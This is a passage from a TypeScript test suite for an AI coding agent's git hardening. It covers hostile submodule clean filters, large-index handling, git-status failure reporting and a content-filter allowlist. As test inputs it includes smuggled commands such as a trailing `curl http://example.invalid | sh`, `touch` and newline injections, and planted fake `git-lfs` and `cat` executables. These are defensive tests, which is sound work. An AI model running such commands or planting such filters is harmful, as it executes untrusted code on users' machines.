    git(superRepo, ['commit', '-qm', 'add submodule']);

    const submodule = join(superRepo, 'vendor', 'lib');
    git(submodule, ['config', 'filter.deep.clean', `${trap('sub-clean')}; cat`]);
    // Same length as the original, so git cannot skip the content comparison
    // that runs the clean filter.
    writeFileSync(join(submodule, 'notes.bin'), 'after.\n');
  });

  afterEach(() => {
    rmSync(base, { recursive: true, force: true });
  });

  /**
   * Prove that a git call made in `dir` really does run the submodule's clean
   * filter — i.e. that this directory is one where the refusal has something
   * to refuse over. Without it, "Codeep stopped" would pass just as happily
   * in a directory git ignores.
   */
  function proveReachableFrom(dir: string): void {
    git(dir, ['status', '--porcelain']);
    expect(fired()).toEqual(['sub-clean']);
    rmSync(join(markers, 'sub-clean'));
  }

  it('does not take a plain directory named .git for the repository root', () => {
    // `mkdir sub/.git` is the entire setup. It needs no privileges, it is
    // something a build tool or an unpacked archive can leave behind, and a
    // prompt injection that gets `write_file` pointed at it is the same
    // thing done deliberately.
    const work = join(superRepo, 'sub');
    mkdirSync(join(work, '.git'), { recursive: true });
    writeFileSync(join(work, '.git', 'notes.txt'), 'not a git directory\n');

    proveReachableFrom(work);

    expect(() => hardenedGitEnv({ cwd: work, noHooks: true })).toThrow(/filter\.deep\.clean/);
    // The refusal cost nothing: building an environment runs `git config
    // --list`, `git rev-parse` and `git ls-files`, none of which refresh an
    // index, so the trap is still cold.
    expect(fired()).toEqual([]);
  });

  it('does not take a git directory with no HEAD for the repository root', () => {
    // The other half, and the one that is an accident rather than an attack:
    // an interrupted `git init` or `git clone`, or a `.git` somebody deleted
    // a file out of. git's own validate_headref() is what decides this, and
    // one `statSync` of HEAD is the cheap approximation of it — git walks
    // straight past such a directory to the repository above, and so must
    // the layout.
    const work = join(superRepo, 'work');
    mkdirSync(work);
    git(base, ['init', '-q', work]);
    rmSync(join(work, '.git', 'HEAD'));
    // Everything else a git directory has is still there, so `isDirectory()`
    // is as true as it ever was.
    expect(existsSync(join(work, '.git', 'objects'))).toBe(true);
    expect(existsSync(join(work, '.git', 'config'))).toBe(true);

    proveReachableFrom(work);

    expect(() => hardenedGitEnv({ cwd: work, noHooks: true })).toThrow(/filter\.deep\.clean/);
    expect(fired()).toEqual([]);
  });
});

/**
 * A repository with a lot of files in it — a monorepo, not a hostile
 * repository.
 *
 * The submodule enumeration lists the whole index on EVERY hardened git call,
 * and it did that through the config scan's 16MB buffer. That buffer is sized
 * for a `.git/config` somebody PADDED, where 16MB is already absurd; an index
 * listing is sized by how many files the repository has, where 16MB is about
 * 100k paths. Past it execFileSync threw ENOBUFS and the catch turned that
 * into a hardening refusal — so every git call in the repository stopped,
 * with a message about submodules the user does not have, and no fixture in
 * this file was big enough to notice.
 */
describe.skipIf(!hasGit || !posix)('a repository whose index is bigger than the config scan buffer', () => {
  isolateGitConfig();
  let monorepo: string;

  /** The buffer the index listing used to share with the config scan. */
  const OLD_SHARED_BUFFER = 16 * 1024 * 1024;

  /**
   * Put more paths in the index than a 16MB listing can hold.
   *
   * `git update-index --index-info` writes index entries directly, so this
   * costs one pass over a string instead of 22k files on disk: measured at
   * ~80ms here, against the several minutes the honest version would take.
   * The paths are long on purpose — the listing is dominated by them, so
   * fewer, longer entries reach the same number of bytes for less work.
   */
  function padIndexBeyondSharedBuffer(): number {
    // One real blob, reused by every entry: `--index-info` wants an object
    // that exists, and 22k of them would be the slow way to say the same
    // thing.
    const blob = git(monorepo, ['hash-object', '-w', '--stdin'], 'pad\n').trim();
    const dir = Array(15).fill('pad'.padEnd(63, 'd')).join('/');
    const lines: string[] = [];
    for (let i = 0; i < 22_000; i++) {
      lines.push(`100644 ${blob} 0\t${dir}/file${String(i).padStart(6, '0')}.txt`);
    }
    git(monorepo, ['update-index', '--index-info'], `${lines.join('\n')}\n`);
    return lines.length;
  }

  beforeEach(() => {
    base = realpathSync(mkdtempSync(join(tmpdir(), 'codeep-git-big-index-')));
    markers = join(base, 'markers');
    mkdirSync(markers);
    monorepo = join(base, 'repo');
    git(base, ['init', '-q', 'repo']);
    git(monorepo, ['config', 'user.email', 'test@test.com']);
    git(monorepo, ['config', 'user.name', 'Test User']);
    writeFileSync(join(monorepo, 'app.ts'), 'export const x = 1;\n');
    git(monorepo, ['add', '-A']);
    git(monorepo, ['commit', '-qm', 'initial']);
    padIndexBeyondSharedBuffer();
  });

  afterEach(() => {
    rmSync(base, { recursive: true, force: true });
  });

  it('is an index the old buffer really could not hold, so the test below is not vacuous', () => {
    // The fixture asserting itself. A padding loop that quietly stopped
    // short would leave every other test here passing for the wrong reason,
    // and the byte count is not something to eyeball — this is the same
    // command the enumeration runs, through the buffer it used to run it
    // with.
    expect(() =>
      execFileSync('git', ['ls-files', '-s', '-z', '--full-name', '--abbrev=4', '--', ':/'], {
        cwd: monorepo,
        maxBuffer: OLD_SHARED_BUFFER,
        stdio: ['ignore', 'pipe', 'pipe'],
      })
    ).toThrow(/ENOBUFS/);
  });

  it('hardens the repository instead of refusing it', () => {
    // The whole finding in one line: having files is not a hostile config,
    // and Codeep must not answer it with the refusal it reserves for one.
    expect(() => hardenedGitEnv({ cwd: monorepo, noHooks: true })).not.toThrow();
  });

  it('reads the listing whole, so a gitlink past the old buffer is still found', () => {
    // A bigger buffer that still truncated would be the worse bug: no
    // refusal, no error, and a submodule nobody looked at. The gitlink sorts
    // AFTER every padding path ("z" > "p"), so it only exists for a reader
    // that got to the end — and nothing declares it, so the name-based half
    // of the enumeration cannot find it either. It has to come out of the
    // index listing or not at all.
    git(monorepo, ['init', '-q', join(monorepo, 'zz-vendor', 'lib')]);
    const submodule = join(monorepo, 'zz-vendor', 'lib');
    git(submodule, ['config', 'user.email', 'test@test.com']);
    git(submodule, ['config', 'user.name', 'Test User']);
    writeFileSync(join(submodule, 'notes.txt'), 'x\n');
    git(submodule, ['add', '-A']);
    git(submodule, ['commit', '-qm', 'initial']);
    git(monorepo, ['add', 'zz-vendor/lib']);
    git(submodule, ['config', 'filter.deep.clean', `${trap('sub-clean')}; cat`]);
    expect(existsSync(join(monorepo, '.gitmodules'))).toBe(false);

    expect(() => hardenedGitEnv({ cwd: monorepo, noHooks: true })).toThrow(/filter\.deep\.clean/);
  });
});

/**
 * A repository where git itself fails — not a refusal, and not a repository
 * with nothing to commit.
 *
 * `autoCommitAgentChanges` read `status.refusal` and then `status.hasChanges`,
 * and nothing in between, so every git failure that is not a hardening
 * refusal came out as "No changes detected by git" — the sentence for a clean
 * working tree. The agent had just written files, the user had auto-commit
 * switched on, and the message said there was nothing to commit. Worse,
 * agentExecution.ts matches that exact string to decide what NOT to show, so
 * the failure was swallowed on its way to the screen as well.
 *
 * The other two cases are asserted where their fixtures live: the refusal in
 * "a repository that configures its own content filter", and the genuinely
 * clean tree in "a repository with no commits yet".
 */
describe.skipIf(!hasGit)('a repository whose git status fails outright', () => {
  isolateGitConfig();
  let broken: string;

  beforeEach(() => {
    base = realpathSync(mkdtempSync(join(tmpdir(), 'codeep-git-broken-')));
    broken = join(base, 'project');
    git(base, ['init', '-q', 'project']);
    git(broken, ['config', 'user.email', 'test@test.com']);
    git(broken, ['config', 'user.name', 'Test User']);
    writeFileSync(join(broken, 'app.ts'), 'export const x = 1;\n');
    git(broken, ['add', '-A']);
    git(broken, ['commit', '-qm', 'initial']);
    // The change the agent just made, which is what the auto-commit is for.
    writeFileSync(join(broken, 'app.ts'), 'export const x = 2;\n');
    // `core.bare = true` over a checkout that HAS a working tree. git then
    // declines every command that needs one — "fatal: this operation must be
    // run in a work tree" — while `rev-parse` and `ls-files` keep answering,
    // so the hardening completes and only the status read fails. It is a real
    // shape (a `.git` copied out of a bare clone leaves it behind) and a
    // deterministic one: no permissions, no sizes, no timing.
    git(broken, ['config', 'core.bare', 'true']);
  });

  afterEach(() => {
    rmSync(base, { recursive: true, force: true });
  });

  it('is a git failure and not a refusal, which is what makes the two branches different', () => {
    const status = getGitStatus(broken);

    expect(status.refusal).toBeUndefined();
    expect(status.error).toMatch(/must be run in a work tree/);
    // The field autoCommitAgentChanges reads: undefined because nobody knows,
    // not false because there is nothing.
    expect(status.hasChanges).toBeUndefined();
  });

  it('autoCommitAgentChanges reports the failure instead of "No changes detected by git"', () => {
    const result = autoCommitAgentChanges(
      'change the entrypoint',
      [{ type: 'edit', target: 'app.ts', result: 'success', timestamp: Date.now() }],
      broken
    );

    expect(result.success).toBe(false);
    expect(result.error).toMatch(/must be run in a work tree/);
    // Not the sentence for a clean tree — which agentExecution.ts matches on
    // to decide the run had nothing to say.
    expect(result.error).not.toBe('No changes detected by git');
  });
});

/**
 * The absolute-path arm of the content-filter allowlist, on its own.
 *
 * `git lfs install` writes `git-lfs filter-process` when git-lfs is the one
 * on PATH and an absolute path when it is not, and git-annex does the same —
 * so the whole-value list refused perfectly ordinary repositories, which is
 * the fail-closed policy landing on the integrations it exists to keep
 * running. The relaxation compares the program's BASENAME plus the argument
 * tail exactly, and then insists the path names the program PATH already
 * resolves that basename to.
 *
 * That last condition is the one doing the security work, and the "plants its
 * own" test below is why: without it the repository picks the program, and
 * one checked-in executable called `git-lfs` — or `cat`, which is on the list
 * with no arguments at all — is the end of the rule.
 *
 * No git here: these are the byte-level decisions, and a live repository
 * would only make them slower to read. The end-to-end half is in the
 * known-safe-integration suite above.
 */
describe.skipIf(!posix)('isSafeContentFilterCommand, the absolute-path spellings', () => {
  let bin: string;
  let program: string;
  let env: NodeJS.ProcessEnv;

  beforeEach(() => {
    base = realpathSync(mkdtempSync(join(tmpdir(), 'codeep-filter-allowlist-')));
    bin = join(base, 'bin');
    mkdirSync(bin);
    program = join(bin, 'git-lfs');
    writeFileSync(program, '#!/bin/sh\ncat\n');
    chmodSync(program, 0o755);
    // The only PATH these decisions may consult, so the machine this runs on
    // cannot change the answer.
    env = { PATH: bin };
  });

  afterEach(() => {
    rmSync(base, { recursive: true, force: true });
  });

  it('accepts the program PATH resolves to, with the tail exactly as the list spells it', () => {
    expect(isSafeContentFilterCommand(`${program} filter-process`, env)).toBe(true);
    expect(isSafeContentFilterCommand(`${program} filter-process --skip`, env)).toBe(true);
    expect(isSafeContentFilterCommand(`${program} clean -- %f`, env)).toBe(true);
    expect(isSafeContentFilterCommand(`${program} smudge -- %f`, env)).toBe(true);
  });

  it('accepts every bare spelling without consulting the filesystem at all', () => {
    // The literals answer first, so a machine with none of these programs
    // installed decides them the same way as a machine with all of them.
    for (const command of SAFE_CONTENT_FILTER_COMMANDS) {
      expect(isSafeContentFilterCommand(command, { PATH: '/nonexistent' }), command).toBe(true);
    }
  });

  it('refuses a program the repository planted, however familiar the name', () => {
    // The attack the basename comparison would otherwise hand over, and it
    // needs nothing but a file: check in an executable called `git-lfs`,
    // point the filter at it with a tail that is on the list, and git runs
    // it on the next `git status`.
    const planted = join(base, 'checkout', 'tools');
    mkdirSync(planted, { recursive: true });
    const theirs = join(planted, 'git-lfs');
    writeFileSync(theirs, '#!/bin/sh\necho pwned\n');
    chmodSync(theirs, 0o755);

    expect(isSafeContentFilterCommand(`${theirs} filter-process`, env)).toBe(false);
    // `cat` is the sharper version of the same thing: it is on the list with
    // no arguments, so the whole value is one path the repository chose.
    const theirCat = join(planted, 'cat');
    writeFileSync(theirCat, '#!/bin/sh\necho pwned\n');
    chmodSync(theirCat, 0o755);
    expect(isSafeContentFilterCommand(theirCat, env)).toBe(false);
  });

  it.each([
    ['a trailing shell command', (p: string) => `${p} filter-process; curl http://example.invalid | sh`],
    ['a bare trailing semicolon', (p: string) => `${p} filter-process;`],
    ['a leading command', (p: string) => `touch /tmp/codeep-pwned && ${p} filter-process`],
    ['an extra argument', (p: string) => `${p} filter-process --skip --extra`],
    ['a tail that is not on the list', (p: string) => `${p} smudge`],
    ['a tail from the wrong program', (p: string) => `${p} clean`],
    ['double spaces between the words', (p: string) => `${p}  filter-process`],
    ['a tab between the words', (p: string) => `${p}\tfilter-process`],
    ['a no-break space between the words', (p: string) => `${p} filter-process`],
    [
      'a non-breaking hyphen in the program name',
      (p: string) => `${p.replace(/git-lfs$/, 'git‑lfs')} filter-process`,
    ],
    ['an uppercase program name', (p: string) => `${p.replace(/git-lfs$/, 'GIT-LFS')} filter-process`],
    ['an uppercase argument', (p: string) => `${p} FILTER-PROCESS`],
    ['a quoted program, which the bare spellings allow and this one does not', (p: string) => `"${p}" filter-process`],
    ['a relative path', () => 'bin/git-lfs filter-process'],
    ['a bare program name that is not on the list', () => 'git-lfs-wrapper filter-process'],
    [
      'a .. that walks back out of the directory PATH names',
      (p: string) => `${p.replace(/git-lfs$/, '../bin/git-lfs')} filter-process`,
    ],
    ['a trailing space', (p: string) => `${p} filter-process `],
    ['a newline', (p: string) => `${p} filter-process\ntouch /tmp/codeep-pwned`],
  ])('refuses an absolute-path spelling with %s', (_name, build) => {
    // Every one of these differs from an accepted value by the bytes alone —
    // same fixture, same PATH, same program on disk — so what refuses them is
    // the comparison and not a missing file.
    expect(isSafeContentFilterCommand(build(program), env)).toBe(false);
  });
});
